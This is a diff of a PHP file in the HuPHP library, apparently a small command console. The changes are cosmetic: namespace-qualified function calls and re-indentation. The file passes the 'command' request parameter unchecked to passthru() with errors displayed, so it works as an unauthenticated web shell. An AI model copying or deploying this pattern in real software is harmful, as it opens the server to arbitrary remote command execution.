@@ -9,10 +9,10 @@ namespace Hubbitus\HuPHP;
 * @author Pahan-Hubbitus (Pavel Alexeev) <Pahan@Hubbitus.info>
 **/
 
-error_reporting(E_ALL);
-ini_set('display_errors', true);
-ini_set('display_startup_errors', true);
-$command = htmlspecialchars($_REQUEST['command'] ?? '');
+\error_reporting(E_ALL);
+\ini_set('display_errors', true);
+\ini_set('display_startup_errors', true);
+$command = \htmlspecialchars($_REQUEST['command'] ?? '');
 ?>
 
 <form method="post">
@@ -24,8 +24,8 @@ $command = htmlspecialchars($_REQUEST['command'] ?? '');
 <hr>
 <pre>
 <?php
-    if (isset($_REQUEST['command'])) {
-        \passthru($_REQUEST['command'] . ' 2>&1');
-    }
+	if (isset($_REQUEST['command'])) {
+		\passthru($_REQUEST['command'] . ' 2>&1');
+	}
 ?>
 </pre>
